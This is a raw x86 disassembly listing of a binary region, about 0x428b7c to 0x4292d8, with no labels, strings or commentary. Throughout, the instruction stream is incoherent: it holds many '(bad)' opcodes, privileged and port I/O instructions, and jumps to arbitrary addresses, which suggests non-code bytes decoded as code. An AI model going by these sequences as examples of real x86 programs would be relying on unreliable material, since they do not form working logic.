  428b7c:	dec    ebp
  428b7d:	ret    
  428b7e:	mov    edi,DWORD PTR [esi-0x4]
  428b81:	pop    eax
  428b82:	dec    ebp
  428b83:	jne    0x428b10
  428b85:	xor    edi,esp
  428b87:	inc    eax
  428b88:	dec    ebp
  428b89:	jbe    0x428bde
  428b8b:	inc    eax
  428b8c:	pop    ebp
  428b8d:	add    edx,DWORD PTR [esi+0x8]
  428b90:	push   eax
  428b91:	dec    eax
  428b92:	push   ecx
  428b93:	mov    eax,edi
  428b95:	and    al,0xf0
  428b97:	jo     0x428b84
  428b99:	mov    eax,DWORD PTR [ebx]
  428b9b:	sbb    BYTE PTR [ebp+0x4d],cl
  428b9e:	mov    eax,DWORD PTR [ebx]
  428ba0:	nop
  428ba1:	or     BYTE PTR [eax],al
  428ba3:	jne    0x428bfc
  428ba5:	cmp    ebx,DWORD PTR [eax+0x33893277]
  428bab:	cld    
  428bac:	xor    edi,edi
  428bae:	add    edi,DWORD PTR [ebp+0x3]
  428bb1:	cmp    DWORD PTR [ecx+0xbcfe8fc],ecx
  428bb7:	js     0x428b3d
  428bb9:	jae    0x428bbd
  428bbb:	(bad)  
  428bbd:	xor    al,0x5d
  428bbf:	jmp    0x428b4c
  428bc1:	mov    ecx,DWORD PTR [ecx*4+0x33dfb1de]
  428bc8:	fdecstp 
  428bca:	test   BYTE PTR [edi],ah
  428bcc:	add    bh,BYTE PTR [ebp+0x0]
  428bcf:	add    ebx,DWORD PTR [ebp-0x77]
  428bd2:	mov    edi,eax
  428bd4:	cmp    al,0x0
  428bd7:	adc    dh,BYTE PTR [ebx]
  428bd9:	jge    0x428bde
  428bdb:	mov    edi,DWORD PTR [ebx]
  428bdd:	jl     0x428bee
  428bdf:	clc    
  428be0:	dec    edi
  428be1:	jge    0x428be3
  428be3:	mov    eax,DWORD PTR [ebx]
  428be5:	jb     0x428bef
  428be7:	mov    ecx,DWORD PTR [ebp-0x8]
  428bea:	mov    edi,edi
  428bec:	xor    edx,DWORD PTR [eax]
  428bee:	add    edi,DWORD PTR [ebx]
  428bf0:	mov    DWORD PTR [ebp-0x10],edi
  428bf3:	inc    edi
  428bf4:	pop    ebp
  428bf5:	jge    0x428c32
  428bf7:	cmp    esi,DWORD PTR [esp+edi*8-0x75]
  428bfb:	mov    edx,0xc05d87f0
  428c00:	imul   ebx,DWORD PTR [esi+0x14],0xffffffc9
  428c04:	fimul  WORD PTR [eax]
  428c06:	fist   WORD PTR [ebp+0x1c]
  428c09:	in     al,dx
  428c0a:	jne    0x428bf8
  428c0c:	mov    edi,DWORD PTR [edx-0x7a27a10]
  428c12:	imul   edx,DWORD PTR [ebp+0x14],0xffffffc7
  428c16:	fdivp  st(0),st
  428c18:	fild   WORD PTR [ebp+0x4510f85c]
  428c1e:	test   BYTE PTR [ebx+0x4d00fc02],cl
  428c24:	inc    ebp
  428c25:	mov    ecx,DWORD PTR [ebx+0x454dfcfc]
  428c2b:	mov    ebp,DWORD PTR [ebx-0x4]
  428c2e:	adc    al,0x8b
  428c30:	rcl    DWORD PTR [eax],0x48
  428c33:	mov    esi,0x7080803
  428c38:	fiadd  WORD PTR [ebp+0x4d]
  428c3b:	mov    cs,WORD PTR [ebx+0x558bfc52]
  428c41:	cld    
  428c42:	xor    ebx,DWORD PTR [ebx+0x330103]
  428c48:	mov    DWORD PTR [edi+0x872dc],edi
  428c4e:	xlat   BYTE PTR ds:[ebx]
  428c4f:	into   
  428c50:	ffreep st(6)
  428c52:	retf   0x6c7
  428c55:	iret   
  428c56:	dec    ebp
  428c57:	inc    ebp
  428c58:	mov    DWORD PTR [ebx],edi
  428c5a:	fmul   QWORD PTR [edi]
  428c5c:	dec    ebp
  428c5d:	jnp    0x428c92
  428c5f:	add    BYTE PTR [ebx],al
  428c61:	mov    ecx,DWORD PTR [esp+edi*8]
  428c64:	inc    ebp
  428c65:	dec    ebp
  428c66:	lea    esi,[ebx]
  428c68:	add    DWORD PTR [ebx],eax
  428c6a:	jb     0x428ca7
  428c6c:	add    BYTE PTR [edi],cl
  428c6e:	inc    ebp
  428c6f:	imul   eax,edi,0x858bd800
  428c75:	cld    
  428c76:	clc    
  428c77:	mov    DWORD PTR [ebp+0x0],eax
  428c7a:	inc    DWORD PTR [eax]
  428c7c:	or     al,0xde
  428c7e:	sbb    bh,0x1
  428c81:	retf   
  428c82:	add    BYTE PTR [eax+edx*1+0x33004d02],al
  428c89:	dec    ebp
  428c8a:	add    ecx,DWORD PTR [ecx-0x250b2b77]
  428c90:	enter  0x12de,0xdf
  428c94:	inc    ebp
  428c95:	pop    ebp
  428c96:	dec    DWORD PTR [ebx-0x257f0ff4]
  428c9c:	add    DWORD PTR [edx],edx
  428c9e:	add    BYTE PTR [ebp+0x50],dl
  428ca1:	mov    ecx,DWORD PTR [ecx+0x45d2f4fc]
  428ca7:	xor    esi,DWORD PTR [ecx-0x38c699fd]
  428cad:	or     ah,al
  428caf:	pop    ss
  428cb0:	cdq    
  428cb1:	push   ebp
  428cb2:	clc    
  428cb3:	mov    eax,DWORD PTR [ebp-0x4]
  428cb6:	xor    edx,edx
  428cb8:	add    esi,DWORD PTR [ebx]
  428cba:	cmp    eax,DWORD PTR [ebx]
  428cbc:	hlt    
  428cbd:	cmp    DWORD PTR [ebx],esp
  428cbf:	or     al,BYTE PTR [ebp+0xf]
  428cc2:	mov    eax,DWORD PTR [edx]
  428cc4:	loopne 0x428cc6
  428cc6:	(bad)  
  428cc7:	mov    ecx,esi
  428cc9:	cld    
  428cca:	pushf  
  428ccb:	pop    ebp
  428ccc:	cwde   
  428ccd:	mov    esi,DWORD PTR [edx]
  428ccf:	lock mov eax,eax
  428cd2:	adc    BYTE PTR [ebx],al
  428cd4:	or     BYTE PTR [ebx+0x4d001001],0xcf
  428cdb:	xor    ebp,DWORD PTR [edi+0x50e45189]
  428ce1:	dec    ebp
  428ce2:	mov    ecx,DWORD PTR [ebx-0x31390304]
  428ce8:	(bad)  
  428ce9:	iret   
  428cea:	inc    ebp
  428ceb:	(bad)  
  428cec:	jne    0x428d3b
  428cee:	mov    ecx,DWORD PTR [ebx+0x3c603d8]
  428cf4:	(bad)  
  428cf5:	cmp    ebx,eax
  428cf7:	je     0x428c7f
  428cf9:	add    edi,edi
  428cfb:	or     bh,bh
  428cfd:	dec    ebp
  428cfe:	inc    ebp
  428cff:	mov    esi,DWORD PTR [ebx]
  428d01:	cld    
  428d02:	add    ecx,esi
  428d04:	cmp    ecx,DWORD PTR [eax-0xc]
  428d07:	mov    edx,DWORD PTR [edi]
  428d09:	or     BYTE PTR [ebp-0x7c],al
  428d0c:	mov    ebx,DWORD PTR [eax-0x7639cd18]
  428d12:	test   BYTE PTR [eax+ebx*4],cl
  428d15:	inc    ebp
  428d16:	xor    bh,BYTE PTR ds:0x8be89c89
  428d1c:	out    dx,eax
  428d1d:	adc    BYTE PTR [eax],al
  428d1f:	jne    0x428ce8
  428d21:	mov    ebp,esp
  428d23:	fcomp  DWORD PTR [ebx]
  428d25:	add    BYTE PTR [ecx],al
  428d27:	inc    DWORD PTR [ebp-0x75]
  428d2a:	mov    ?,esp
  428d2c:	add    al,0xce
  428d2e:	mov    ecx,edi
  428d30:	cld    
  428d31:	inc    ebp
  428d32:	fidivr WORD PTR [ebx]
  428d34:	fbstp  TBYTE PTR [ebp-0x3e]
  428d37:	mov    eax,DWORD PTR [eax]
  428d39:	adc    BYTE PTR [ebx-0x3974038b],cl
  428d3f:	fadd   st,st(7)
  428d41:	add    BYTE PTR [ebp-0x1],al
  428d44:	mov    ecx,DWORD PTR [esp+edi*8]
  428d47:	inc    ebp
  428d48:	mov    bh,0xc7
  428d4b:	loopne 0x428d92
  428d4d:	sbb    ecx,DWORD PTR [ebx+0x4545fc7f]
  428d53:	add    DWORD PTR [ebx],esi
  428d55:	pushf  
  428d56:	add    ecx,DWORD PTR [ebx-0x398b03c5]
  428d5c:	mov    eax,edi
  428d5e:	cwde   
  428d5f:	inc    ebp
  428d60:	inc    ebp
  428d61:	jne    0x428cee
  428d63:	mov    esp,esp
  428d65:	clc    
  428d66:	add    al,0x4d
  428d68:	mov    DWORD PTR [ebx],esi
  428d6a:	or     al,0x33
  428d6c:	inc    ebp
  428d6d:	lea    ecx,[ebx-0x398d13fd]
  428d73:	add    bh,al
  428d75:	inc    ebp
  428d76:	ror    DWORD PTR [ebx+0x45d829],0x8b
  428d7d:	add    ebp,esp
  428d7f:	shufps xmm1,xmm3,0xc7
  428d83:	(bad)  
  428d84:	jmp    0x7487c8ad
  428d89:	xor    ecx,DWORD PTR [ebx+0x453bec03]
  428d8f:	hlt    
  428d90:	mov    ecx,DWORD PTR [edi]
  428d92:	fadd   DWORD PTR [ebp+0x0]
  428d95:	xor    ecx,DWORD PTR [edi]
  428d97:	add    ecx,ecx
  428d99:	cmp    edi,edi
  428d9b:	pmuludq mm7,QWORD PTR [edx+0x50]
  428d9f:	(bad)  
  428da0:	jmp    0x428d2d
  428da2:	mov    edi,esp
  428da4:	or     al,0xc6
  428da6:	inc    ebp
  428da7:	(bad)  
  428da8:	mov    eax,DWORD PTR [ebp+0x10]
  428dab:	jne    0x428d36
  428dad:	mov    eax,DWORD PTR [ecx]
  428daf:	clc    
  428db0:	add    BYTE PTR [ebp-0x40],cl
  428db3:	xor    edx,DWORD PTR [eax-0x73]
  428db6:	jne    0x428db9
  428db8:	push   DWORD PTR [edx+0x8]
  428dbb:	add    BYTE PTR [ebp+0x45],al
  428dbe:	mov    ebp,ecx
  428dc0:	cld    
  428dc1:	add    BYTE PTR [ebp+0x0],cl
  428dc4:	xor    eax,DWORD PTR [ebp+0x3]
  428dc7:	mov    al,0x3b
  428dc9:	adc    cl,BYTE PTR [ebx+0x110cf8c7]
  428dcf:	sub    eax,0x5d330e4d
  428dd4:	lea    esi,[ebx]
  428dd6:	add    DWORD PTR [ebx],eax
  428dd8:	jb     0x428dc3
  428dda:	add    BYTE PTR [eax],al
  428ddc:	inc    ebp
  428ddd:	add    bl,ch
  428ddf:	inc    ebp
  428de0:	mov    esi,DWORD PTR [ebx]
  428de2:	or     al,0x3
  428de4:	(bad)  
  428de5:	mov    edi,eax
  428de7:	in     al,dx
  428de8:	scas   eax,DWORD PTR es:[edi]
  428de9:	inc    ebp
  428dea:	mov    esi,DWORD PTR [ebx]
  428dec:	in     al,0x3
  428dee:	add    al,0x89
  428df0:	mov    ecx,DWORD PTR [eax+edi*8]
  428df3:	dec    ebp
  428df4:	(bad)  
  428df5:	mov    ebx,DWORD PTR [esp+ebx*8-0x30cd3168]
  428dfc:	mov    ecx,eax
  428dfe:	cld    
  428dff:	push   es
  428e00:	dec    ebp
  428e01:	add    al,0x33
  428e03:	mov    DWORD PTR [ebx],eax
  428e05:	in     al,dx
  428e06:	cmp    DWORD PTR [ebp-0x67],eax
  428e09:	mov    eax,DWORD PTR [ebp-0xba0068]
  428e0f:	mov    edx,DWORD PTR [ebp-0x4]
  428e12:	mov    ecx,DWORD PTR [ebp-0x18]
  428e15:	xor    ecx,DWORD PTR [ebp+0x3]
  428e18:	cmp    DWORD PTR [ebx],0x8b327497
  428e1e:	xor    edi,esp
  428e20:	jmp    0xff768b72
  428e25:	add    ecx,DWORD PTR [ebp-0x3f]
  428e28:	xor    ebx,DWORD PTR [edi]
  428e2a:	add    eax,ecx
  428e2c:	cmp    ebx,DWORD PTR [eax]
  428e2e:	mov    ecx,DWORD PTR [ebp-0x4]
  428e31:	mov    ecx,DWORD PTR [eax]
  428e33:	adc    BYTE PTR [ebp-0x80],al
  428e36:	jmp    0x428e39
  428e38:	mov    eax,DWORD PTR [eax]
  428e3a:	cld    
  428e3b:	mov    bh,0xc6
  428e3d:	push   ecx
  428e3e:	(bad)  
  428e3f:	jne    0x428e9f
  428e41:	dec    ecx
  428e43:	or     BYTE PTR [ecx+ebx*1],cl
  428e46:	push   ebp
  428e47:	inc    ebp
  428e48:	in     al,dx
  428e49:	add    ebp,esp
  428e4b:	or     bh,al
  428e4d:	dec    ebp
  428e4e:	cld    
  428e4f:	mov    eax,DWORD PTR [ebp+0x4500f8d8]
  428e55:	cmp    DWORD PTR [ecx],0x2
  428e58:	pushf  
  428e59:	dec    DWORD PTR [ebx+0x45510cf4]
  428e5f:	mov    DWORD PTR [ebx+0x5045fc0c],ecx
  428e65:	mov    edx,DWORD PTR [ecx+0xc]
  428e68:	xor    eax,esi
  428e6a:	mov    edx,0xc172c7
  428e6f:	inc    ebp
  428e70:	mov    esi,DWORD PTR [ebp+0x8]
  428e73:	mov    eax,edx
  428e75:	call   0x84c7556a
  428e7a:	add    DWORD PTR [eax-0x76bace00],ebx
  428e80:	mov    ebp,eax
  428e82:	or     BYTE PTR [eax],dl
  428e84:	jo     0x428ed3
  428e86:	push   edi
  428e87:	xor    esi,DWORD PTR [ebp+0x3]
  428e8a:	(bad)  
  428e8b:	pmulhuw mm0,mm1
  428e8e:	test   DWORD PTR [ebp-0x8],ecx
  428e91:	mov    DWORD PTR [ebp-0x67],eax
  428e94:	mov    eax,DWORD PTR [ebp-0x4]
  428e97:	xor    edi,DWORD PTR [ebp-0x73]
  428e9a:	xor    eax,DWORD PTR [ebx]
  428e9c:	xor    esi,DWORD PTR [edx+0x3]
  428e9f:	add    BYTE PTR [ecx],bh
  428ea1:	inc    ebp
  428ea2:	(bad)  
  428ea3:	mov    edx,DWORD PTR [ebp-0x7b39fe1c]
  428ea9:	mov    DWORD PTR [eax],0x750f0004
  428eaf:	sub    ecx,DWORD PTR [ebx-0x7974f701]
  428eb5:	lock add BYTE PTR [ebp+0x0],al
  428eb9:	mov    esi,DWORD PTR [ebp-0x2c]
  428ebc:	mov    ebp,edx
  428ebe:	or     al,0x72
  428ec0:	ja     0x428ec2
  428ec2:	mov    edx,esi
  428ec4:	cld    
  428ec5:	(bad)  
  428ec8:	cli    
  428ec9:	mov    esi,DWORD PTR [ebp-0x4]
  428ecc:	cmp    ecx,esi
  428ece:	bswap  edi
  428ed0:	(bad)
  428ed4:	mov    esi,DWORD PTR [ebp-0x4]
  428ed7:	mov    esi,ecx
  428ed9:	clc    
  428eda:	repnz add esi,DWORD PTR [ebp+0x45]
  428ede:	push   ebx
  428edf:	xor    eax,DWORD PTR [ebp+0x3]
  428ee2:	cmp    ebx,DWORD PTR [edi-0x64]
  428ee5:	pop    ebx
  428ee6:	jmp    0x428fad
  428eeb:	mov    esi,DWORD PTR [ebp-0x7d]
  428eee:	xor    ebp,DWORD PTR [eax]
  428ef0:	lea    eax,[ebp-0x8]
  428ef3:	cmp    dl,dh
  428ef5:	pushf  
  428ef6:	out    dx,eax
  428ef7:	(bad)  
  428ef8:	neg    eax
  428efa:	ins    DWORD PTR es:[edi],dx
  428efb:	test   esi,edi
  428efd:	clc    
  428efe:	pop    esp
  428eff:	inc    ebp
  428f00:	or     BYTE PTR [ecx+0x450f0c7d],cl
  428f06:	xor    edi,DWORD PTR [ecx+0x70f08e6]
  428f0c:	add    cl,al
  428f0e:	jne    0x428ea8
  428f10:	mov    esi,DWORD PTR [edx]
  428f12:	in     al,dx
  428f13:	push   esi
  428f14:	xor    BYTE PTR [ebp-0xe],dh
  428f17:	add    edi,esi
  428f19:	cmp    esi,DWORD PTR [edi+0xc21c10f]
  428f1f:	add    cl,bh
  428f21:	mov    edi,DWORD PTR [ebp+0x8]
  428f24:	mov    DWORD PTR [ebp-0x14],esi
  428f27:	add    esi,DWORD PTR [ebp+0x3c]
  428f2a:	mov    ecx,DWORD PTR [ecx+0x45f10c08]
  428f30:	mov    ah,0x3d
  428f32:	cwde   
  428f33:	pushf  
  428f34:	xor    cl,BYTE PTR [ebx+0x75e0e489]
  428f3a:	jne    0x428ec7
  428f3c:	mov    ecx,DWORD PTR [esp+ebp*8]
  428f3f:	icebp  
  428f40:	icebp  
  428f41:	shl    edx,0xf2
  428f44:	(bad)  
  428f45:	mov    ah,0x16
  428f47:	cmp    BYTE PTR [ebp-0x6d],dh
  428f4a:	mov    ecx,DWORD PTR [edi]
  428f4c:	in     al,dx
  428f4d:	jmp    0x428f40
  428f4f:	add    dl,dh
  428f51:	mov    edi,esi
  428f53:	or     al,0x8
  428f55:	inc    ebp
  428f56:	jne    0x428f5b
  428f58:	mov    esp,DWORD PTR [eax-0x74c1ff24]
  428f5e:	ret    
  428f5f:	or     bh,bh
  428f61:	jge    0x428f4b
  428f63:	sub    ebx,DWORD PTR [edi+0x17d5d34]
  428f69:	xor    edi,eax
  428f6b:	add    esi,DWORD PTR [ebp-0x77]
  428f6e:	mov    ebx,esp
  428f70:	clc    
  428f71:	neg    DWORD PTR [ebp-0x7c]
  428f74:	xor    eax,DWORD PTR [eax]
  428f76:	cmp    eax,DWORD PTR [eax]
  428f78:	repz jne 0x428f10
  428f7b:	xor    eax,DWORD PTR [ecx]
  428f7d:	add    ebx,DWORD PTR [eax]
  428f7f:	mov    DWORD PTR [ebp-0x8],eax
  428f82:	mov    eax,edi
  428f84:	cld    
  428f85:	lock pop eax
  428f87:	test   DWORD PTR [ebx],esi
  428f89:	clc    
  428f8a:	add    edx,DWORD PTR [edi-0x740bff77]
  428f90:	fdivp  st(4),st
  428f92:	test   ecx,esi
  428f94:	(bad)  
  428f95:	jnp    0x428f96
  428f97:	add    ecx,DWORD PTR [ebx-0x14c4272f]
  428f9d:	jae    0x428f2a
  428f9f:	sub    edi,esp
  428fa1:	(bad)  
  428fa2:	shl    DWORD PTR [eax-0x3e],0x89
  428fa6:	leave  
  428fa7:	call   0x819846b4
  428fac:	in     al,dx
  428fad:	(bad)  
  428fae:	in     al,dx
  428faf:	add    bh,al
  428fb1:	mov    esp,edi
  428fb3:	in     al,dx
  428fb4:	test   DWORD PTR [ebp-0x8],edi
  428fb7:	mov    eax,DWORD PTR [ebp+0x2b]
  428fba:	cmp    DWORD PTR [ebx],eax
  428fbc:	pushf  
  428fbd:	jnp    0x57318bf6
  428fc3:	xor    edx,DWORD PTR [eax-0x77]
  428fc6:	push   ecx
  428fc7:	loopne 0x428ffc
  428fc9:	jne    0x428f86
  428fcb:	mov    esi,DWORD PTR [edx-0x20]
  428fce:	add    BYTE PTR [ebp-0x3d],bh
  428fd1:	xor    eax,DWORD PTR [ebp-0x73]
  428fd4:	mov    edi,DWORD PTR [esi]
  428fd6:	cld    
  428fd7:	jb     0x428f9f
  428fd9:	add    bl,al
  428fdb:	jne    0x429022
  428fdd:	mov    edx,DWORD PTR [edi-0x10]
  428fe0:	jge    0x42905f
  428fe2:	mov    esi,DWORD PTR [ebx]
  428fe4:	lock add ecx,DWORD PTR [ebp+0x3b]
  428fe8:	xor    esi,DWORD PTR [ebp-0x77]
  428feb:	mov    esi,eax
  428fed:	lock inc ebp
  428fef:	jge    0x429029
  428ff1:	xor    ebx,DWORD PTR [ebx+eax*1+0x75f83b8b]
  428ff8:	dec    ebp
  428ff9:	mov    esi,DWORD PTR [ebx]
  428ffb:	loopne 0x428f86
  428ffd:	jge    0x428ff7
  428fff:	add    DWORD PTR [ebp-0x7d],eax
  429002:	clc    
  429003:	add    bl,BYTE PTR [ebp+ecx*2-0x740b8a75]
  42900a:	dec    ebp
  42900b:	hlt    
  42900c:	xor    ebx,DWORD PTR [ebp-0x77]
  42900f:	mov    esi,esp
  429011:	in     al,0x45
  429013:	jge    0x429051
  429015:	mov    ebx,DWORD PTR [esp+ecx*1-0x43130e75]
  42901c:	dec    ebp
  42901d:	cmp    al,0x33
  42901f:	xchg   ebx,eax
  429020:	mov    DWORD PTR [ebx-0x14],esi
  429023:	add    eax,DWORD PTR [ebp-0xc]
  429026:	cmp    BYTE PTR [ebp-0x61],dh
  429029:	mov    edi,DWORD PTR [eax+0xf19504]
  42902f:	repnz mov DWORD PTR [ebp+0x20],ebx
  429033:	cmp    eax,DWORD PTR [ebp+0xf]
  429036:	test   DWORD PTR [edi+ecx*1-0x1],edx
  42903a:	fistp  WORD PTR [ebx+0x0]
  42903d:	inc    ebp
  42903e:	mov    ebx,DWORD PTR [edi+0xc]
  429041:	add    eax,eax
  429043:	inc    ebp
  429044:	test   BYTE PTR [ebx],dh
  429046:	add    eax,DWORD PTR [ebx]
  429048:	add    BYTE PTR [esi+0x45],bl
  42904b:	ret    0x85
  42904e:	jnp    0x5443141d
  429054:	inc    bp
  429056:	inc    ebp
  429057:	cmp    BYTE PTR [ecx+0xc78a9c],bh
  42905d:	fdiv   QWORD PTR [ebx]
  42905f:	test   DWORD PTR [ecx+0x453af8],edi
  429065:	push   ebx
  429066:	add    edi,DWORD PTR [esi+0x708088b]
  42906c:	cmp    esi,eax
  42906e:	sets   BYTE PTR [ecx-0x74fcffce]
  429075:	mov    esp,edi
  429077:	call   0x33cdd5c9
  42907c:	or     BYTE PTR [ebx],al
  42907e:	inc    ecx
  42907f:	mov    DWORD PTR [ecx+0x408b0ce0],ecx
  429085:	and    BYTE PTR [ebp-0x7074f0bb],al
  42908b:	lock add cl,al
  42908e:	mov    DWORD PTR [ebp-0x2c],0xf8f08581
  429095:	mov    ch,0x45
  429097:	clc    
  429098:	xor    eax,DWORD PTR [ebp+0x3]
  42909b:	mov    ecx,DWORD PTR [ecx+0x45c1d4f8]
  4290a1:	inc    ebp
  4290a2:	mov    eax,DWORD PTR [ecx-0x7aff0770]
  4290a8:	mov    edi,eax
  4290aa:	mov    eax,DWORD PTR [ebp+0x3c]
  4290ad:	mov    ecx,DWORD PTR [eax]
  4290af:	hlt    
  4290b0:	inc    ebp
  4290b1:	ror    DWORD PTR [ebx+0x818c45],0xf4
  4290b8:	mov    eax,DWORD PTR [ebp+0x45e4f889]
  4290be:	push   ebp
  4290bf:	mov    edi,DWORD PTR [ebx]
  4290c1:	in     al,dx
  4290c2:	jne    0x429085
  4290c4:	mov    eax,DWORD PTR [ebp-0x28]
  4290c7:	add    DWORD PTR [eax],0xe8058dec
  4290cd:	clc    
  4290ce:	mov    esp,DWORD PTR [edi-0x8]
  4290d1:	add    dh,dl
  4290d3:	rol    WORD PTR [ebp-0x1],cl
  4290d7:	mov    edx,DWORD PTR [eax+0x8]
  4290da:	jne    0x42909c
  4290dc:	inc    DWORD PTR [esp+ebx*1-0x74ffb2fd]
  4290e3:	inc    ebp
  4290e4:	push   esp
  4290e5:	test   DWORD PTR [ecx+0xf],ecx
  4290e8:	sub    edx,esp
  4290ea:	add    eax,DWORD PTR [eax]
  4290ec:	and    BYTE PTR [ebx-0x3fc4e7b0],cl
  4290f2:	add    BYTE PTR [ebx+ecx*4-0x78ffdffd],al
  4290f9:	mov    eax,DWORD PTR [ecx]
  4290fb:	and    BYTE PTR [eax],al
  4290fd:	adc    BYTE PTR ss:[eax],al
  429100:	inc    ebp
  429101:	inc    cx
  429104:	push   esp
  429105:	cld    
  429106:	jne    0x429108
  429108:	push   edx
  429109:	enterw 0xc1,0x4d
  42910e:	mov    esp,DWORD PTR [esi+0x20]
  429111:	add    DWORD PTR [ecx-0x7b],eax
  429114:	add    eax,DWORD PTR [ebx]
  429116:	str    WORD PTR [eax+0x45]
  42911a:	lea    ecx,[ebx+0x45890801]
  429120:	sbb    BYTE PTR [ebx],al
  429122:	dec    ebp
  429123:	cmp    al,0xf
  429125:	inc    ebp
  429126:	push   eax
  429127:	mov    esi,DWORD PTR [ebx]
  429129:	push   eax
  42912a:	add    eax,eax
  42912c:	mov    DWORD PTR [esp+ecx*1-0x7bff2efd],eax
  429133:	inc    ebp
  429134:	add    BYTE PTR [eax],bh
  429136:	add    BYTE PTR [ebp+ecx*2+0x3d4338b],cl
  42913d:	(bad)  
  42913e:	mov    ebx,eax
  429140:	loopne 0x429187
  429142:	dec    ebp
  429143:	mov    ecx,DWORD PTR [edi]
  429145:	cld    
  429146:	push   eax
  429147:	xchg   DWORD PTR [ebx],esi
  429149:	add    DWORD PTR [ebx],ebp
  42914b:	add    BYTE PTR [ebx],ch
  42914d:	or     BYTE PTR [ecx],bh
  42914f:	dec    ecx
  429150:	loopne 0x429155
  429152:	xchg   DWORD PTR [ebx-0x78ff0400],ecx
  429158:	push   ebp
  429159:	add    DWORD PTR [ebx+0x55100800],eax
  42915f:	dec    ebp
  429160:	jmp    0x4290eb
  429162:	mov    esp,DWORD PTR [eax]
  429164:	sbb    dl,dl
  429166:	inc    eax
  429167:	xor    ecx,DWORD PTR [ebp+0x4501ff87]
  42916d:	add    BYTE PTR [ebx+0x74528555],cl
  429173:	push   ebp
  429174:	div    DWORD PTR [ebx]
  429176:	and    eax,DWORD PTR [ebx]
  429178:	add    edx,DWORD PTR [edx-0x30]
  42917b:	jno    0x429108
  42917d:	inc    DWORD PTR [eax+eiz*1]
  429180:	inc    ebp
  429181:	push   eax
  429182:	push   eax
  429183:	mov    esp,DWORD PTR [edi-0x74beff1c]
  429189:	mov    edi,esp
  42918b:	push   eax
  42918c:	inc    ebp
  42918d:	enter  0x458b,0x8
  429191:	push   ecx
  429192:	(bad)  
  429193:	call   0x10c9b6b
  429198:	pop    ss
  429199:	push   ebp
  42919a:	mov    ecx,DWORD PTR [ebx+0x489408]
  4291a0:	mov    ecx,DWORD PTR [ecx+0xc458b04]
  4291a6:	push   ecx
  4291a7:	jo     0x429191
  4291a9:	inc    DWORD PTR [edi]
  4291ab:	or     BYTE PTR [eax],al
  4291ad:	call   0xcd98f7
  4291b2:	fmul   QWORD PTR [ebp+0x55]
  4291b5:	mov    eax,DWORD PTR [ebx-0x313ed7c4]
  4291bb:	mov    bh,0x8c
  4291bd:	adc    al,0x98
  4291bf:	dec    esp
  4291c0:	xor    bl,BYTE PTR [eax]
  4291c2:	mov    ecx,DWORD PTR [ebp+0xc]
  4291c5:	mov    eax,DWORD PTR [ebp-0x4]
  4291c8:	mov    esi,DWORD PTR [edi-0x3148f924]
  4291ce:	push   es
  4291cf:	retf   
  4291d0:	mov    BYTE PTR [ebp-0x30],0x3b
  4291d4:	inc    ebp
  4291d5:	movntps XMMWORD PTR [eax-0x741fff77],xmm5
  4291dc:	retf   0x83fc
  4291df:	into   
  4291e0:	dec    ebp
  4291e1:	retf   
  4291e2:	mov    ecx,DWORD PTR [ebp-0x74]
  4291e5:	mov    eax,DWORD PTR [eax]
  4291e7:	fdiv   QWORD PTR [ebx]
  4291e9:	mov    bh,0x3
  4291eb:	push   es
  4291ec:	mov    esi,ecx
  4291ee:	sbb    cl,dl
  4291f0:	dec    ebp
  4291f1:	sar    DWORD PTR [ebx],cl
  4291f3:	push   ebp
  4291f4:	jne    0x429205
  4291f6:	mov    ecx,DWORD PTR [eax-0x74ffff28]
  4291fc:	lea    ebx,[eax]
  4291fe:	call   0xf4cc1dc5
  429203:	sbb    dh,dl
  429205:	add    edx,ebx
  429207:	push   ebp
  429208:	mov    ecx,DWORD PTR [ebx+0x487238e4]
  42920e:	push   ecx
  42920f:	mov    DWORD PTR [eax-0x30],edx
  429212:	test   DWORD PTR [edx],eax
  429214:	xadd   esp,esi
  429217:	pop    es
  429218:	add    cl,dl
  42921a:	mov    eax,ecx
  42921c:	or     al,0x45
  42921e:	(bad)  
  42921f:	push   eax
  429220:	add    DWORD PTR [edx+0x0],eax
  429223:	add    ecx,DWORD PTR [ecx]
  429225:	and    dh,cl
  429227:	call   0xc69af7
  42922c:	add    DWORD PTR [ebp+0x0],edx
  42922f:	mov    esp,DWORD PTR [ebp+0x18]
  429232:	add    BYTE PTR [eax+0x44],cl
  429235:	xor    eax,DWORD PTR [eax]
  429237:	add    esp,DWORD PTR [esi+0x3b]
  42923a:	inc    ebp
  42923b:	je     0x4291c0
  42923d:	push   ecx
  42923e:	or     cl,BYTE PTR [ebp-0x77]
  429241:	add    eax,esi
  429243:	or     al,0x5e
  429245:	inc    eax
  429246:	add    BYTE PTR [ebx],al
  429248:	data16 and BYTE PTR [ebp+0x50],al
  42924c:	sub    DWORD PTR [ecx],0xffffffe8
  42924f:	add    BYTE PTR [ebp-0x75],ah
  429252:	add    BYTE PTR [eax],bl
  429254:	enter  0x894d,0x8b
  429258:	int3   
  429259:	loopne 0x42928d
  42925b:	rol    BYTE PTR [eax],0x33
  42925e:	lea    cx,[ebp+0xa]
  429262:	data16 jb 0x4292aa
  429265:	add    BYTE PTR [ebx+0x44890855],cl
  42926b:	sbb    ah,al
  42926d:	inc    ebp
  42926e:	lldt   WORD PTR ss:[edx+0x66]
  429273:	xor    ecx,DWORD PTR [eax]
  429275:	sub    edi,esp
  429277:	mov    eax,DWORD PTR [eax]
  429279:	or     al,0x66
  42927b:	ror    edx,cl
  42927d:	dec    ebp
  42927e:	inc    ebp
  42927f:	cmp    eax,DWORD PTR [ebx+0x668b0876]
  429285:	cld    
  429286:	or     BYTE PTR [edi+0x4501dd],dl
  42928c:	(bad)  
  42928d:	into   
  42928e:	out    dx,al
  42928f:	retf   
  429290:	(bad)  
  429291:	dec    ebp
  429292:	mov    al,0x8b
  429294:	jmp    0xea27:0x450ac320
  42929b:	xchg   esi,ebp
  42929d:	add    edi,eax
  42929f:	add    BYTE PTR [eax+0x3f52e955],bh
  4292a5:	push   ebp
  4292a6:	inc    ebp
  4292a7:	xor    ebx,esp
  4292a9:	add    ebp,esi
  4292ab:	push   edx
  4292ac:	push   bp
  4292ae:	inc    ebp
  4292af:	(bad)  
  4292b0:	in     eax,dx
  4292b1:	push   esp
  4292b2:	(bad)  
  4292b3:	inc    edx
  4292b5:	sbb    al,0x33
  4292b7:	ror    BYTE PTR [ebp-0x75fef27c],0x0
  4292be:	add    BYTE PTR [ebp+0x43],0x8b
  4292c2:	jmp    0xf98b:0x100041c8
  4292c9:	xor    esi,DWORD PTR [edx+0x3]
  4292cc:	mov    ecx,DWORD PTR [edi]
  4292ce:	fmul   DWORD PTR [edx]
  4292d0:	add    BYTE PTR [eax],al
  4292d2:	lea    eax,[ebx-0x4700273c]
  4292d8:	add    al,0x4f
